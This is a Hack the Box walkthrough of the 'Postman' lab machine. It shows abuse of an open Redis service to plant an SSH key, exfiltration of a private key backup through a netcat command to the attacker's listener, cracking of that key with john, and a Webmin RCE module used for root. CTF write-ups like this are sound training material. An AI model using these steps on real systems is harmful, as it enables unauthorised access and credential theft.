+++
author = "Nick"
categories = ["hack the box", "webmin", "redis", "ssh2john", "reverse shell", "john"]
date = 2020-03-14T10:00:00Z
description = ""
draft = false
image = "__GHOST_URL__/content/images/2020/03/postman.png"
slug = "hack-the-box-postman"
summary = "Today we are doing the Hack the Box machine, Postman. It's a Linux machine listed as easy. Let's jump in!"
tags = ["hack the box", "webmin", "redis", "ssh2john", "reverse shell", "john"]
title = "Hack the Box - Postman"

+++


Welcome back! Today we are doing the Hack the Box machine, Postman. It's a Linux machine listed as easy. Let's jump in!

As normal, we start with an ```nmap``` scan: 

```nmap -sC -sV -T4 -p- -oA all_scan 10.10.10.160```

Here are our results:
```
Nmap scan report for 10.10.10.160
Host is up (0.053s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.88 seconds
```

Some interesting results, we see ```Redis``` and ```Webmin``` being hosted. Let's see what is on port 80 first.

We are greeted by a basic landing page. Nothing really in the source either. We will now see what is on port 10000. When we browse there we are told that we need to go to ```Postman:10000``` in order to view whats going on. So we add ```postman``` to our host file and browse over.

{{< figure src="__GHOST_URL__/content/images/2019/12/image-23.png" >}}

We see a Webmin login page.

{{< figure src="__GHOST_URL__/content/images/2019/12/image-24.png" >}}

We try the standard credentials and they don't work. A quick ```searchsploit``` gives us some results.

{{< figure src="__GHOST_URL__/content/images/2019/12/image-25.png" >}}

However none of the RCE's work and the others are authenticated exploits. With a seemingly dead end there, we look to the ```Redis``` port. Some quick googling shows [there is a vulnerablity here](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html). So to fully leverage this, we'll need the ```Redis-CLI``` tools installed. Here's a [handy link](https://codewithhugo.com/install-just-redis-cli-on-ubuntu-debian-jessie/) for that!

With our tools installed we can now replicate this exploit. The only catch is, we don't know a user. If we google around enough we find some posts about people having a ```/var/lib/redis``` location. We can use that as our starting point. If there is a file with that name, we can hope there might be a ```.ssh``` directory too, since you know, this is a CTF ;).

We connect via ```redis-cli``` and issue the following command to check the directory.

Command:
```config set dir /var/lib/redis```

{{< figure src="__GHOST_URL__/content/images/2019/12/image-26.png" >}}

Looks like it is a viable location. We repeat with the ```.ssh``` location.

{{< figure src="__GHOST_URL__/content/images/2019/12/image-27.png" >}}

That too worked. So we can follow the steps in our exploit! First we generate a new ssh key with ```ssh-keygen```.

{{< figure src="__GHOST_URL__/content/images/2019/12/keygen.gif" >}}

We then pad the key with some spaces. Then read it to memory and dump it to the ```authorized_keys``` file accoring to our exploit document.

{{< figure src="__GHOST_URL__/content/images/2019/12/redis_exploit.gif" >}}

Now we should be able to SSH in as redis.

{{< figure src="__GHOST_URL__/content/images/2019/12/image-28.png" >}}

Success! We now can see if we have access to user.txt but we don't. So we download ```linenum``` and start enumerating. One file is of interest. ```id_rsa.bak```.

{{< figure src="__GHOST_URL__/content/images/2019/12/image-29.png" >}}

We then transfer this file back to our machine. We can use ```netcat``` for this:

On our attacking machine we spin up a listener:
```nc -l -p 9999 > ssh_file.tgz < /dev/null```.

On our server we send the file:
```cat id_rsa.bak | nc 10.10.14.119 9999```

Once we have the file, we can send it through ```ssh2john``` to convert it to a proper format for cracking.

{{< figure src="__GHOST_URL__/content/images/2019/12/image-30.png" >}}

We can now send this file into ```john``` and use ```rockyou.txt``` to hopefully crack it.

Command:
```john --wordlist=/usr/share/wordlists/rockyou.txt stolen_key```

{{< figure src="__GHOST_URL__/content/images/2019/12/john.gif" >}}

We get a password of ```computer2008```. We can switch back to our redis ssh session and use ```su Matt``` and the password we just found to get user access and the ```user.txt``` file. We enumerate a bit more as Matt now but don't see all that much. However, thinking like a user might be good here. This password might be reused. Head over to the Webmin portal with those credentials and we have access!

This means we can use one of our authenticated exploits we saw earlier to elevate. In this case we'll just go down the list, the first is the ```webmin_packageup_rce```.  We load the module and set our options. We require a few this time, ```Password```, ```rhosts```, ```ssl```, ```username``` and ```lhost```

{{< figure src="__GHOST_URL__/content/images/2019/12/image-22.png" >}}

We get all our settings set and let it rip!

{{< figure src="__GHOST_URL__/content/images/2019/12/postman_root.gif" >}}

There we have it, root access!

Hopefully something was learned. If you found this write-up helpful, consider sending some respect my way: [Lovecore's HTB Profile](https://www.hackthebox.eu/home/users/profile/95635).

